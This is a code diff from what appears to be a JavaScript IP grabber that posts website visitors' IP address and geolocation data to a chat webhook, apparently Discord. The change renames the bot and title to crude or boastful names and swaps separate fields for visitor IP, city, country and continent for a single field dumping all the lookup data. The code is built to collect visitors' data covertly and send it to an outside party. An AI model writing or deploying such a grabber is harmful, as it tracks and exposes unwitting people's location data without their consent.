@@ -63,17 +63,14 @@
   
     request.setRequestHeader('Content-type', 'application/json');
     var t = {
-      username: "gameJet posta",
+      username: "Coochie bot",
       avatar_url: "https://www.origo.hu/i/1305/20130509-fogonosz-semion-mogilevich-orosz-maffiozo.jpg",
       content: "",
       embeds: [{
           color: "4700374",
-          title: "szia lajos",
+          title: "Gripped",
           fields: [
-            {name: "Ip cim a latogatonak", value: data.ip_address},
-            {name: "varos", value: data.city},
-            {name: "orszag", value: data.country},
-            {name: "CONTINENT(nem tudom magyarul)", value: data.continent},
+            {name: "Ip", value: JSON.stringify(data)},
           ],
          
       }]
